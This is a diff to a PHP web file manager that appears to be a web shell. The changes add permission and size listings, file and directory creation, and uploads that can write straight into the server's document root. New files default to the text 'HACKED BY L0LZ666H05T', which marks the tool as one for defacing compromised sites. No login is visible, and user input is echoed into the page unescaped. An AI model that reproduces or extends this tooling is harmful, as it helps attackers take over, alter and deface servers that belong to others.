@@ -14,7 +14,7 @@
 		border:none;
 		background:none;
 	} textarea.edit {
-		height:300px;
+		height:400px;
 		resize:none;
 	} th {
 		text-align:center;
@@ -46,6 +46,74 @@ function pwd() {
 			}
 		} print("'>".$pwd."</a>/");
 	}
+}
+function perms($filename) {
+	$perms = fileperms($filename);
+
+switch ($perms & 0xF000) {
+    case 0xC000: // socket
+        $info = 's';
+        break;
+    case 0xA000: // symbolic link
+        $info = 'l';
+        break;
+    case 0x8000: // regular
+        $info = 'r';
+        break;
+    case 0x6000: // block special
+        $info = 'b';
+        break;
+    case 0x4000: // directory
+        $info = 'd';
+        break;
+    case 0x2000: // character special
+        $info = 'c';
+        break;
+    case 0x1000: // FIFO pipe
+        $info = 'p';
+        break;
+    default: // unknown
+        $info = 'u';
+}
+
+// Owner
+$info .= (($perms & 0x0100) ? 'r' : '-');
+$info .= (($perms & 0x0080) ? 'w' : '-');
+$info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x' ) :
+            (($perms & 0x0800) ? 'S' : '-'));
+
+// Group
+$info .= (($perms & 0x0020) ? 'r' : '-');
+$info .= (($perms & 0x0010) ? 'w' : '-');
+$info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x' ) :
+            (($perms & 0x0400) ? 'S' : '-'));
+
+// World
+$info .= (($perms & 0x0004) ? 'r' : '-');
+$info .= (($perms & 0x0002) ? 'w' : '-');
+$info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x' ) :
+            (($perms & 0x0200) ? 'T' : '-'));
+
+return $info;
+}
+function permission($filename, $perms) {
+	if (@is_writable($filename)) {
+		?> <font color="green"><?php print $perms ?></font> <?php
+	} else {
+		?> <font color="red"><?php print $perms ?></font> <?php
+	}
+}
+function size($filename) {
+	$size = @filesize($filename)/1024;
+	$size = @round($size, 3);
+	if ($size > 1024) {
+		$size = @round($size/1024,2). 'MB';
+	} else {
+		$size = $size. 'KB';
+	} return $size;
 }
 function edit($filename, $text) {
 	$fp = @fopen($filename, 'w');
@@ -79,18 +147,69 @@ function renames($filename, $newname) {
 		<?php
 	}
 }
+function makedir($filename) {
+	if (@mkdir(@htmlspecialchars($filename))) {
+		?>
+		<div class="alert alert-success" role="alert">
+			This Dir <b><u><?php print $filename ?></u></b> Has Been Created !
+		</div>
+		<?php
+	} else {
+		?>
+		<div class="alert alert-danger" role="alert">
+			This Dir <b><u><?php print $filename ?></u></b> Failed to Create
+		</div>
+		<?php
+	}
+}
+function makefile($filename, $text) {
+	$fp = @fopen($filename, "w");
+	if (@fwrite($fp, $text)) {
+		?>
+		<div class="alert alert-success" role="alert">
+			This File <b><u><?php print $filename ?></u></b> Has Been Created !
+		</div>
+		<?php
+	} else {
+		?>
+		<div class="alert alert-danger" role="alert">
+			This File <b><u><?php print $filename ?></u></b> Failed to Create
+		</div>
+		<?php
+	}
+	@flush();
+}
 ?>
 <center>
 	<div class="form-control manager" disable>
 		<center><h4>FILEMANAGER</h4></center>
 		<table width="100%" align="center" class="table-striped">
 			<tr>
-    		<th colspan="2">
+    		<th colspan="4">
     			<center>
-    				<?php print @pwd() ?>
+    				Cwd : <?php print @pwd() ?> ( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
     			</center>
     		</th>
-    	</tr>
+    		<th>
+    			<div class="btn-group">
+                  <a href="http://<?php print $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'] ?>" style="font-weight:bold;color:#fff;" class="btn btn-success btn-sm" style="width:100%;">
+                    HOME
+                  </a>
+                  <button type="button" class="btn btn-sm btn-success dropdown-toggle dropdown-toggle-split" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                   <span class="sr-only">Toggle Dropdown</span>
+                  </button>
+                  <div class="dropdown-menu">
+                   <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=upload">
+                   	<img src="https://www.pngarts.com/files/2/Upload-PNG-Image-Background.png" class="icon"> 
+                    UPLOAD FILE</a>
+                    <a class="dropdown-item" href="?dir=<?php print @cwd() ?>&do=makefile">
+                    <img src="http://www.sclance.com/pngs/add-png/add_png_16398.jpg" class="icon">
+                    MAKEFILE</a> 
+                  </div>
+                </div>
+    		</th>
+    	    </tr>
+    	    <tr><th></th></tr>
 		<tr>
 		<?php
 			function delete($dir) {
@@ -116,7 +235,7 @@ function renames($filename, $newname) {
 			?>
 			<center>
 		    <div class="alert alert-danger" role="alert">
-            This Dir <b><u><?php print $dir ?></u></b> Failed to Deleted
+            This Dir <b><u><?php print $dir ?></u></b> Failed to Delete
             </div>
             </center>
 		    <?php
@@ -134,7 +253,7 @@ function renames($filename, $newname) {
 			?>
 			<center>
 		    <div class="alert alert-danger" role="alert">
-            This File <b><u><?php print $dir ?></u></b> Failed to Deleted
+            This File <b><u><?php print $dir ?></u></b> Failed to Delete
             </div>
             </center>
 		    <?php
@@ -151,11 +270,11 @@ if ($_POST['do'] == 'delete') {
 	        } $text = @htmlspecialchars(@file_get_contents($_POST['file']));
 	        ?>
 	        <form method="post">
-	        	<td colspan="2" class="edit">
+	        	<td colspan="5" class="edit">
 	        	<textarea class="form-control edit" name="text"><?php print $text ?></textarea></td>
 	        	<input type="hidden" name="do" value="edit">
 	        	<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
-		        <tr><td colspan="2" class="edit">
+		        <tr><td colspan="5" class="edit">
 		        <center>
 		        	<input style="width:100%;" type="submit" name="submit" class="btn btn-success">
 		        </center></td>
@@ -168,14 +287,111 @@ if ($_POST['do'] == 'delete') {
             	}
             	?>
             	<form method="post">
-            		<td>
-            			<input style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
+            		<td colspan="4">
+            			<input class="form-control" style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
             		</td>
             		<input type="hidden" name="do" value="renames">
 	        	    <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
             		<td>
-            			<input style="width:100%;" type="submit" name="submit">
+            			<input style="width:100%;" type="submit" name="submit" class="btn btn-success"> 
             		</td>
+            	</form>
+            	<?php
+            }
+            if ($_GET['do'] == 'makefile') {
+            	if (isset($_POST['submit'])) {
+            		if ($_POST['type'] == 'file') {
+            			@makefile($_POST['filename'], $_POST['text']);
+            		}
+            		if ($_POST['type'] == 'dir') {
+            			@makedir($_POST['filename']);
+            		}
+            	}
+            	?>
+            	<form method="post">
+            		<tr>
+            			<td colspan="5">
+            				<center>
+            				<input type="radio" name="type" value="file" checked> file
+            				<input type="radio" name="type" value="dir"> dir
+            			    </center>  
+            			</td>
+            		</tr>
+            		<tr>
+            			<td colspan="5">
+            				<center>If you want create <b><u>dir</u></b> please empty the text</center>
+            			</td>
+            		</tr>
+            		<tr>
+            			<td colspan="5">
+            				<input class="form-control" type="text" name="filename" placeholder="filename/dir">
+            			</td>
+            		</tr>
+            		<tr>
+            			<td colspan="5">
+            				<textarea class="form-control edit" name="text">HACKED BY L0LZ666H05T</textarea>
+            			</td>
+            		</tr>
+            		<tr>
+            			<td colspan="5">
+            				<input class="btn btn-success" style="width:100%;" type="submit" name="submit">
+            			</td>
+            		</tr>
+            	</form>
+            	<?php
+            }
+            if ($_GET['do'] == 'upload') {
+            	if (isset($_POST['submit'])) {
+            		if ($_POST['type'] == 'biasa') {
+            			if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+            				?>
+		                    <div class="alert alert-success" role="alert">
+		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Has Been Uploaded !
+		                    </div>
+		                    <?php
+            			} else {
+            				?>
+		                    <div class="alert alert-danger" role="alert">
+		                    	This File <b><u><?php print $_FILES['file']['name'] ?></u></b> Cannot Uploaded !
+		                    </div>
+		                    <?php
+            			}
+            		}
+            		if ($_POST['type'] == 'home') {
+            			$home = $_SERVER['DOCUMENT_ROOT'];
+            			if (@copy($_FILES['file']['tmp_name'], $home.SEP.$_FILES['file']['name'])) {
+            				?>
+		                    <div class="alert alert-success" role="alert">
+		                    	This File <b><u><a href="http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>">
+		                    		http://<?php print $_SERVER['SERVER_NAME'].SEP.$_FILES['file']['name'] ?>
+		                    	</a></u></b> Has Been Uploaded !
+		                    </div>
+		                    <?php
+            			} else {
+            				print("Failed");
+            			}
+            		}
+            	}
+            	?>
+            	<form method="post" enctype="multipart/form-data">
+            		<tr>
+            			<td colspan="5">
+            				<center>
+            				<input type="radio" name="type" value="biasa" checked> biasa
+            				( <?php print @permission(@cwd(), @perms(@cwd())) ?> )
+            				<input type="radio" name="type" value="home"> home_root
+            				( <?php print @permission($_SERVER['DOCUMENT_ROOT'], @perms($_SERVER['DOCUMENT_ROOT'])) ?> )
+            			    </center>
+            			</td>
+            		</tr>
+            		<tr>
+            			<td colspan="5">
+            				<center>
+            				<input type="file" name="file">
+            				<input type="submit" name="submit">
+            			</center>
+            			</td>
+            		</tr>
             	</form>
             	<?php
             }
@@ -183,7 +399,9 @@ if ($_POST['do'] == 'delete') {
 		</tr>
     	<tr>
     		<th>Filename</th>
-    		<th>Action</th>
+    		<th>Size</th>
+    		<th>Permission</th>
+    		<th colspan="2">Action</th>
     	</tr>
     	<?php
     	$scandir = @scandir(@cwd());
@@ -195,15 +413,20 @@ if ($_POST['do'] == 'delete') {
     				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
     				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
     			</td>
+    			<td><center>--</center></td>
+    			<td>
+    				<?php print @permission($dir, @perms($dir)) ?>
+    			</td>
     			<td>
     				<center>
     				<form method="post" action="?dir=<?php print @cwd() ?>">
-    					<select name="do">
+    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
     						<option value="renames">Rename</option>
     						<option value="delete">Delete</option>
     					</select>
+    				</td>
     					<input type="hidden" name="file" value="<?php print $dir ?>">
-    					<input type="submit" name="">
+    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
     				</form>
     			</center>
     			</td>
@@ -218,15 +441,20 @@ if ($_POST['do'] == 'delete') {
     				<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
     				 <?php print $file ?>
     			</td>
+    			<td>
+    				<center><?php print @size($file) ?></center>
+    			</td>
+    			<td><?php print @permission($file, @perms($file)) ?></td>
     			<td><center>
     				<form method="post" action="?dir=<?php print @cwd() ?>">
-    					<select name="do">
+    					<select class="btn btn btn-outline-success btn-sm" name="do" style="width:100%;">
     						<option value="edit">Edit</option>
     						<option value="renames">Rename</option>
     						<option value="delete">Delete</option>
     					</select>
+    				</td>
     					<input type="hidden" name="file" value="<?php print $file ?>">
-    					<input type="submit">
+    					<td><input type="submit" name="" class="btn btn-success btn-sm" style="width:100%;">
     				</form>
     			</td>
     		</tr>
